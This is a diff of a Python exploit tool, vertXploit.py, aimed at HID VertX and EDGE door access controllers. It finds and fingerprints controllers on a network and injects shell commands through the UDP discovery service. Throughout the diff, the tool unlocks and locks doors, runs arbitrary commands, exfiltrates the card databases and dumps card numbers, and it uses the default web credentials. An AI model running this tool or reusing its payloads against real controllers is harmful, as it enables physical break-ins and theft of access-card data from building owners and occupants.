@@ -19,7 +19,6 @@
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 # SOFTWARE.
 import argparse
-import netifaces
 import nmap
 import os
 import re
@@ -35,66 +34,82 @@ except:
 
 
 def main():
-	parser = argparse.ArgumentParser(prog='vertXploit.py', description='Exploit HID VertX and Edge door controllers through command injection or the web interface.', usage='vertXploit.py <action> [<args>]')
-	group = parser.add_mutually_exclusive_group(required=True)
-	group.add_argument('-a', dest='action', help='Action to perform on VertX controller', choices=['discover', 'unlock', 'lock', 'download', 'dump'])
-	group.add_argument('-r', dest='raw', help='Linux command, (example: ping -c 5 IP)', nargs='+')
+	parser = argparse.ArgumentParser(prog='vertXploit.py', description='Exploit HID VertX and EDGE door controllers through command injection or the web interface.', usage='./vertXploit.py [discover, fingerprint, unlock, lock, raw, download, dump] [-h]')
+	subparsers = parser.add_subparsers(dest='action', help='Action to perform on controller')
 
-	host_group = parser.add_argument_group('host arguments')
-	host_group.add_argument('--ip', dest='ip', help='VertX controller IP address, (default: 255.255.255.255)', default='255.255.255.255', required=False)
-	host_group.add_argument('--port', dest='port', help='VertX controller port, (default: 4070)', default=4070, type=int, required=False)
+	discover_parser = subparsers.add_parser('discover', help='Discover controllers', usage='./vertXploit.py discover --ip <IP>')
+	discover_parser.add_argument('--ip', dest='ip', help='VertX controller IP address (default: 255.255.255.255)', default='255.255.255.255', required=False)
 
-	auth_group = parser.add_argument_group('authentication arguments')
-	auth_group.add_argument('--username', help='VertX web interface username, (default: root)', default='root', required=False)
-	auth_group.add_argument('--password', help='VertX web interface password, (default: pass)', default='pass', required=False)
+	fingerprint_parser = subparsers.add_parser('fingerprint', help='Fingerprint controller', usage='./vertXploit.py fingerprint <IP>')
+	fingerprint_parser.add_argument('ip', help='VertX controller IP address')
 
-	parser.add_argument('--path', help='Path to database files', default='.', required=False)
+	unlock_parser = subparsers.add_parser('unlock', help='Unlock doors', usage='./vertXploit.py unlock <IP> --username <USERNAME> --password <PASSWORD>')
+	unlock_parser.add_argument('ip', help='VertX controller IP address')
+	unlock_parser.add_argument('--username', help='VertX web interface username, (default: root)', default='root', required=False)
+	unlock_parser.add_argument('--password', help='VertX web interface password, (default: pass)', default='pass', required=False)
+
+	lock_parser = subparsers.add_parser('lock', help='Lock doors', usage='./vertXploit.py lock <IP> --username <USERNAME> --password <PASSWORD>')
+	lock_parser.add_argument('ip', help='VertX controller IP address')
+	lock_parser.add_argument('--username', help='VertX web interface username, (default: root)', default='root', required=False)
+	lock_parser.add_argument('--password', help='VertX web interface password, (default: pass)', default='pass', required=False)
+
+	raw_parser = subparsers.add_parser('raw', help='Send raw Linux command', usage='./vertXploit.py raw <IP> <COMMAND>')
+	raw_parser.add_argument('ip', help='VertX controller IP address')
+	raw_parser.add_argument('command', help='Linux command, (example: ping -c 5 IP)', nargs='+')
+
+	download_parser = subparsers.add_parser('download', help='Download controller database', usage='./vertXploit.py download <IP> --username <USERNAME> --password <PASSWORD>')
+	download_parser.add_argument('ip', help='VertX controller IP address')
+	download_parser.add_argument('--username', help='VertX web interface username, (default: root)', default='root', required=False)
+	download_parser.add_argument('--password', help='VertX web interface password, (default: pass)', default='pass', required=False)
+
+	dump_parser = subparsers.add_parser('dump', help='Dump card values from database', usage='./vertXploit.py dump --path <PATH>')
+	dump_parser.add_argument('--path', help='Path to database files', default='.', required=False)
+
 	args = parser.parse_args()
 
 	# Discover
 	if args.action == 'discover':
-		discover(args.ip, args.port, args.action)
+		discover(args.ip, args.action)
+
+	# Fingerprint
+	elif args.action == 'fingerprint':
+		print_status("Sending discovery request to {0}".format(args.ip))
+		fingerprint(args.ip, args.action)
+
+	# Raw
+	elif args.action == 'raw':
+		raw(args.ip, ''.join(args.command), args.action)
 
 	# Dump
 	elif args.action == 'dump':
-		# Check if database files exist
 		if os.path.isfile("{0}/IdentDB".format(args.path)) and os.path.isfile("{0}/AccessDB".format(args.path)):
 			print_status('Processing card information from VertX database')
 			identdb_data = read_db("{0}/IdentDB".format(args.path))
 			accessdb_data = read_db("{0}/AccessDB".format(args.path))
-
-			# Parse databases
 			parse_db(identdb_data, accessdb_data)
 		else:
 			print_error("Could not find IdentDB or AccessDB in {0}".format(os.path.abspath(args.path)))
 
-	# Raw
-	elif args.raw:
-		raw(args.ip, args.port, args.raw)
-
 	# Unlock, lock, or download
 	else:
-		door_actions(args.ip, args.port, args.username, args.password, args.action)
+		door_actions(args.ip, args.username, args.password, args.action)
 
 
 # Send raw Linux command
-def raw(ip, port, command):
-	vertx_mac, vertx_ip, vertx_version, vulnerable = discover(ip, port, 'raw')
-
-	# Check if vulnerable to command injection
+def raw(ip, command, action):
+	external_ip, mac, model, vulnerable = fingerprint(ip, action)
 	if vulnerable:
-		if vertx_ip and ip == '255.255.255.255':
-			ip = vertx_ip
-
-		payload = "{0};1`{1}`;".format(vertx_mac, ' '.join(command))
-		print_status('Sending raw payload')
-		send_command(ip, port, 'command_blink_on;', payload)
+		if len(command) > 41:
+			print_error("Command is too long to send in one request")
+		else:
+			print_status('Sending raw payload')
+			format_payload(ip, mac, model, command, action)
 	else:
 		print_error('VertX controller is not vulnerable to command injection')
 
 
 # Perform action on VertX controller
-def door_actions(ip, port, username, password, action):
+def door_actions(ip, username, password, action):
 	HEADERS = {
 		'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36',
 		'Accept': '*/*',
@@ -103,226 +118,238 @@ def door_actions(ip, port, username, password, action):
 		'Connection': 'keep-alive'
 	}
 
-	vertx_mac, vertx_ip, vertx_version, vulnerable = discover(ip, port, action)
+	external_ip, mac, model, vulnerable = fingerprint(ip, action)
 
-	if vertx_ip and ip == '255.255.255.255':
-		ip = vertx_ip
+	if external_ip:
+		# Download databases
+		if vulnerable and action == 'download':
+			print_status('Downloading VertX databases')
+			format_payload(external_ip, mac, model, None, action)
+			download_db(external_ip, HEADERS, username, password)
 
-	# Download databases
-	if vulnerable and action == 'download':
-		print_status('Downloading VertX databases')
-		upload_script(ip, port, vertx_mac, vertx_version, action)
-		download_db(ip, HEADERS, username, password)
-
-	# Unlock or lock doors using command injection
-	elif vulnerable and 'lock' in action:
-		print_status("{0}ing doors using command injection".format(action.capitalize()))
-		upload_script(ip, port, vertx_mac, vertx_version, action)
-		print_good("Door successfully {0}ed".format(action))
-
-	# Unlock or lock doors using web interface
-	elif 'lock' in action:
-		print_status("{0}ing doors through the web interface".format(action.capitalize()))
-		response = web_request(ip, vertx_version, HEADERS, username, password, action)
-		if response:
+		# Unlock or lock doors using command injection
+		elif vulnerable and 'lock' in action:
+			print_status("{0}ing doors using command injection".format(action.capitalize()))
+			format_payload(external_ip, mac, model, None, action)
 			print_good("Door successfully {0}ed".format(action))
-		elif response is False:
-			print_warn("Door {0} failed, bad credentials".format(action))
-		else:
-			print_error('VertX controller did not respond')
 
-	else:
-		print_warn("VertX controller is not vulnerable, can not use '{0}' action".format(action))
+		# Unlock or lock doors using web interface
+		elif 'lock' in action:
+			print_status("{0}ing doors through the web interface".format(action.capitalize()))
+			response = web_request(external_ip, model, HEADERS, username, password, action)
+			if response:
+				print_good("Door successfully {0}ed".format(action))
+			elif response is False:
+				print_warn("Door {0} failed, bad credentials".format(action))
+			else:
+				print_error('VertX controller did not respond')
+
+		# Handle actions if not vulnerable
+		else:
+			print_warn("VertX controller is not vulnerable, can not perform {0}".format(action))
 
 
 # Search for VertX controllers on the network
-def discover(ip, port, action):
+def discover(ip, action):
 	controllers = []
 
-	# Send VertX discovery request
-	response_data = send_command(ip, port, 'discover;013;', None)
-	if response_data:
-		vertx_mac, vertx_ip, vertx_version, vulnerable = fingerprint(response_data, action)
+	if ip == '255.255.255.255':
+		print_status('Sending discovery request to local broadcast network')
 
-		if action == 'discover':
-			controllers.append([vertx_ip, '4070', vertx_mac, 'broadcast'])
-		else:
-			return vertx_mac, vertx_ip, vertx_version, vulnerable
+		# Send discover request to local broadcast network
+		external_ip, mac, model, vulnerable = fingerprint(ip, action)
+		if external_ip:
+			controllers.append([external_ip, '4070', mac])
+	else:
+		network_cidr = "{0}.0/24".format('.'.join(ip.split('.')[:-1]))
 
-		# Use nmap to look for MAC address and open ports
-		if ip == '255.255.255.255' and action == 'discover':
-			default_gateway = netifaces.gateways()
-			local_ip = default_gateway['default'][netifaces.AF_INET][0]
-			network_cidr = "{0}.0/24".format('.'.join(local_ip.split('.')[:-1]))
+		# Check open port
+		print_status("Starting Nmap scan on {0}".format(network_cidr))
 
-			print_status("Starting Nmap scan on {0}".format(network_cidr))
+		nm = nmap.PortScanner()
+		nm.scan(network_cidr, arguments='-n -sS --open -Pn -p4050')
+		for host in nm.all_hosts():
+			if nm[host].has_tcp(4050) and nm[host]['tcp'][4050]['state'] == 'open':
+				potential_ip = nm[host]['addresses']['ipv4']
 
-			nm = nmap.PortScanner()
-			nm.scan(network_cidr, arguments='-n -sS --open -Pn -p4050')
-			for host in nm.all_hosts():
-				try:
-					controller = []
-					ip = nm[host]['addresses']['ipv4']
-					mac = nm[host]['addresses']['mac']
+				# Pull info about VertX controller
+				external_ip, mac, model, vulnerable = fingerprint(potential_ip, action)
+				if external_ip:
+					controllers.append([external_ip, '4050', mac])
 
-					# Check open port
-					if nm[host].has_tcp(4050) and nm[host]['tcp'][4050]['state'] == 'open':
-						controller.append('4050')
-
-					# MAC address search
-					mac_regex = re.search('^((?i)00:06:8E:[a-f0-9:]{8})', mac)
-					if mac_regex:
-						controller.append(mac)
-
-					# Prepend IP if port or MAC is found
-					if controller:
-						for entry in controllers:
-							if entry[0] == ip:
-								entry[1] = "{0}/4050".format(entry[1])
-								entry[3] = "{0}/nmap".format(entry[3])
-							else:
-								controller.insert(0, ip)
-								controller.append('nmap')
-								controllers.append(controller)
-
-				except Exception as error:
-					continue
-
-				if len(controllers) > 0:
-					print_good('VertX controllers found:')
-					print(tabulate.tabulate(controllers, headers=['IP', 'Port', 'MAC', 'Method'], tablefmt='psql', stralign='center', numalign='center'))
-				else:
-					print_warn('No VertX controllers found')
+	# Print results
+	if len(controllers) > 0:
+		print_good('VertX controllers found:')
+		print(tabulate.tabulate(controllers, headers=['IP', 'Port', 'MAC'], tablefmt='psql', stralign='center', numalign='center'))
+	else:
+		print_warn('No VertX controllers found')
 
 
 # Get information about VertX controller
-def fingerprint(data, action):
-	response_data = data[0].split(';')
+def fingerprint(ip, action):
+	data = send_command(ip, 'discover;013;', None)
+	if data:
+		response_data = data[0].split(';')
+		name = response_data[3]
+		model = response_data[6]
+		version = response_data[7]
+		date = response_data[8]
+		internal_ip = response_data[4]
+		external_ip = data[1][0]
+		mac = response_data[2]
 
-	# Legacy VertX controllers patched with 2.2.7.568
-	if int(response_data[7][0]) == 2 and int(response_data[7].replace('.', '')) < 227568:
-		vulnerable = True
+		# Legacy VertX controllers patched with firmware > 2.2.7.568
+		# VertX EVO and EDGE EVO controllers patched with firmware > 3.5.1.1483
+		switch = {
+			'E400': 3511483,  # EDGEPlus
+			'EH400': 3511483,  # EDGE EVO
+			'EHS400': 3511483,  # EDGE EVO Solo
+			'ES400': 3511483,  # EDGEPlus Solo
+			'V2-V1000': 3511483,  # VertX EVO
+			'V2-V2000': 3511483,  # VertX EVO
+			'V1000': 227568,  # VertX Legacy
+			'V2000': 227568  # VertX Legacy
+		}
 
-	# EVO VertX controllers patched with 3.5.1.1483
-	elif int(response_data[7][0]) == 3 and int(response_data[7].replace('.', '')) < 3511483:
-		vulnerable = True
+		patched_version = switch.get(model, 0)
+		try:
+			if int(version.replace('.', '')) <= patched_version:
+				vulnerable = True
+			else:
+				vulnerable = False
+		except ValueError:
+				vulnerable = True
+
+		if action == 'fingerprint':
+			print_good("VertX Controller Information")
+			print("RAW: {0}".format(data))
+			print("Name: {0}".format(name))
+			print("Model: {0}".format(model))
+			print("Version: {0} - ({1})".format(version, date))
+			print("Internal IP Address: {0}".format(internal_ip))
+			print("External IP Address: {0}".format(external_ip))
+			print("MAC Address: {0}".format(mac))
+
+			if vulnerable:
+				print("Vulnerable: \033[1m\033[32mTrue\033[0m\n")
+			else:
+				print("Vulnerable: \033[1m\033[33mFalse\033[0m\n")
+
+		return external_ip, mac, model, vulnerable
 
 	else:
-		vulnerable = False
+		if action == 'fingerprint':
+			print_warn('VertX controller did not responded to the discovery request')
+		elif action == 'discover':
+			return False
 
-	if action == 'discover':
-		print_good("VertX Controller Information")
-		print("RAW (ASCII): {0}".format(data))
-		print("Name: {0}".format(response_data[3]))
-		print("Model: {0}".format(response_data[6]))
-		print("Version: {0} - ({1})".format(response_data[7], response_data[8]))
-		print("IP Address: {0}".format(response_data[4]))
-		print("MAC Address: {0}".format(response_data[2]))
 
-		if vulnerable:
-			print("Vulnerable: \033[1m\033[32mTrue\033[0m\n")
+# Format command injection payload
+def format_payload(ip, mac, model, command, action):
+	if action == 'raw':
+		payload_template = "{0};1`{1}`;".format(mac, command)
+		print("({0})".format((payload_template.rstrip()).replace('\n', '\\n')))
+		response = send_command(ip, 'command_blink_on;044;', payload_template)
+		if response:
+			print_good('Payload sent successfully')
 		else:
-			print("Vulnerable: \033[1m\033[33mFalse\033[0m\n")
-
-	return response_data[2], response_data[4], response_data[6], vulnerable
-
-
-# Upload script
-def upload_script(ip, port, mac, version, action):
-	if action == 'unlock':
-		commands = [
-			"export QUERY_STRING=\"?ID=0&BoardType={0}&Description=Strike&Relay=1&Action=1\"".format(version),
-			'/mnt/apps/web/cgi-bin/diagnostics_execute.cgi',
-			'chmod -x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi'
-		]
-
-	elif action == 'lock':
-		commands = [
-			'chmod +x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi',
-			"export QUERY_STRING=\"?ID=0&BoardType={0}&Description=Strike&Relay=1&Action=0\"".format(version),
-			"/mnt/apps/web/cgi-bin/diagnostics_execute.cgi"
-		]
+			print_error('Failed to send payload')
 
 	else:
-		commands = [
-			'cp /mnt/data/config/IdentDB /mnt/apps/web/',
-			'cp /mnt/data/config/AccessDB /mnt/apps/web/',
-			'sleep 15',
-			'rm /mnt/apps/web/IdentDB',
-			'rm /mnt/apps/web/AccessDB'
+		if action == 'unlock':
+			commands = [
+				"export QUERY_STRING=\"?ID=0&BoardType={0}&Description=Strike&Relay=1&Action=1\"".format(model),
+				'/mnt/apps/web/cgi-bin/diagnostics_execute.cgi',
+				'chmod -x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi'
+			]
+
+		elif action == 'lock':
+			commands = [
+				'chmod +x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi',
+				"export QUERY_STRING=\"?ID=0&BoardType={0}&Description=Strike&Relay=1&Action=0\"".format(model),
+				"/mnt/apps/web/cgi-bin/diagnostics_execute.cgi"
+			]
+
+		else:
+			commands = [
+				'cp /mnt/data/config/IdentDB /mnt/apps/web/',
+				'cp /mnt/data/config/AccessDB /mnt/apps/web/',
+				'sleep 15',
+				'rm /mnt/apps/web/IdentDB',
+				'rm /mnt/apps/web/AccessDB'
+			]
+
+		# Split payload in chunks
+		payload_chunks = list(chunk_string('!'.join(commands), 24))
+		for chunk in payload_chunks:
+			payload_template = "{0};1`echo '{1}' >> /tmp/a`;".format(mac, chunk)
+			print("({0})".format((payload_template.rstrip()).replace('\n', '\\n')))
+			send_command(ip, 'command_blink_on;044;', payload_template)
+
+		time.sleep(1)
+
+		format_commands = [
+			[
+				"{0};1`tr -d '\n' < /tmp/a > /tmp/b`;".format(mac),
+				"{0};1`tr '!' '\n' < /tmp/b > /tmp/a`;".format(mac),
+				"{0};1`chmod +x /tmp/a`;".format(mac),
+				"{0};1`/tmp/a`;".format(mac)
+			],
+			[
+				"{0};1`rm /tmp/a`;".format(mac),
+				"{0};1`rm /tmp/b`;".format(mac)
+			]
 		]
 
-	print_status("Sending payload to {0}".format(ip))
-	payload_chunks = list(chunk_string('!'.join(commands), 22))
-	for chunk in payload_chunks:
-		payload = "{0};1`echo '{1}' >> /tmp/a`;".format(mac, chunk)
-		send_command(ip, port, 'command_blink_on;', payload)
+		print_status('Formating and executing payload')
+		for payload in format_commands[0]:
+			send_command(ip, 'command_blink_on;044;', payload)
 
-	print_good('Payload uploaded successfully')
-	time.sleep(1)
+		print_status('Sleeping for 10 seconds before cleaning up')
+		time.sleep(10)
 
-	format_payloads = [
-		[
-			"{0};1`tr -d '\n' < /tmp/a > /tmp/b`;".format(mac),
-			"{0};1`tr '!' '\n' < /tmp/b > /tmp/a`;".format(mac),
-			"{0};1`chmod +x /tmp/a`;".format(mac),
-			"{0};1`/tmp/a`;".format(mac)
-		],
-		[
-			"{0};1`rm /tmp/a`;".format(mac),
-			"{0};1`rm /tmp/b`;".format(mac)
-		]
-	]
-
-	print_status('Formating and executing payload')
-	for payload in format_payloads[0]:
-		send_command(ip, port, 'command_blink_on;', payload)
-
-	print_status('Sleeping for 10 seconds before cleaning up')
-	time.sleep(10)
-
-	for payload in format_payloads[1]:
-		send_command(ip, port, 'command_blink_on;', payload)
+		for payload in format_commands[1]:
+			send_command(ip, 'command_blink_on;044;', payload)
 
 
-# Trigger command injection
-def send_command(ip, port, command, payload):
+# Send commands to VertX controller
+def send_command(ip, command, payload):
 	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	s.settimeout(5)
+
 	if ip == '255.255.255.255':
 		s.bind(('', 0))
 		s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
 
 	if payload:
-		print("({0})".format((payload.rstrip()).replace('\n', '\\n')))
-		payload_buffer = "{0}{1};{2}".format(command, str(len(command) + len(payload) + 4).zfill(3), payload)
+		payload_buffer = "{0}{1}".format(command, payload)
 	else:
-		print_status("Sending discovery request to {0}".format(ip))
 		payload_buffer = command
 
 	try:
-		payload_response = None
-		s.sendto(payload_buffer, (ip, port))
-		payload_response = s.recvfrom(1024)
-		if payload_response:
-			if payload and payload_response[0].split(';')[0] != 'ack':
-				print_error('Payload upload failed')
+		s.sendto(payload_buffer, (ip, 4070))
+		response = s.recvfrom(1024)
+		s.close()
 	except socket.timeout:
-		print_error('VertX controller did not respond')
+		payload_response = None
+	else:
+		if payload and response[0].split(';')[0] == 'ack':
+			payload_response = True
+		elif response[0].split(';')[0] == 'discover':
+			payload_response = False
+		else:
+			payload_response = response
 
 	s.close()
-	if payload_response:
-		return payload_response
-	else:
-		exit()
+	return payload_response
 
 
 # VertX actions through web interface
-def web_request(ip, version, headers, username, password, action):
+def web_request(ip, model, headers, username, password, action):
 	if action == 'unlock':
-		url = "http://{0}/cgi-bin/diagnostics_execute.cgi?ID=0&BoardType={1}&Description=Strike&Relay=1&Action=1&MS={2}406".format(ip, version, str(int(time.time())))
+		url = "http://{0}/cgi-bin/diagnostics_execute.cgi?ID=0&BoardType={1}&Description=Strike&Relay=1&Action=1&MS={2}406".format(ip, model, int(time.time()))
 	else:
-		url = "http://{0}/cgi-bin/diagnostics_execute.cgi?ID=0&BoardType={1}&Description=Strike&Relay=1&Action=0&MS={2}406".format(ip, version, str(int(time.time())))
+		url = "http://{0}/cgi-bin/diagnostics_execute.cgi?ID=0&BoardType={1}&Description=Strike&Relay=1&Action=0&MS={2}406".format(ip, model, int(time.time()))
 
 	try:
 		response = requests.get(url, headers=headers, auth=(username, password), verify=False)
@@ -330,9 +357,9 @@ def web_request(ip, version, headers, username, password, action):
 			return False
 		else:
 			vertx_response = (response.text).split(';')[1]
-			if vertx_response == '-1504':
+			if vertx_response == ';-1504;':
 				return True
-			elif vertx_response == '0':
+			elif vertx_response == ';0;':
 				return False
 			else:
 				return None
@@ -438,7 +465,7 @@ def parse_db(identdb, accessdb):
 		print_warn('No cards in database')
 
 
-# Split command because of 22 character length limit
+# Split command because of 41 character length limit
 def chunk_string(command, length):
 	return (command[0 + i:length + i] for i in range(0, len(command), length))
 
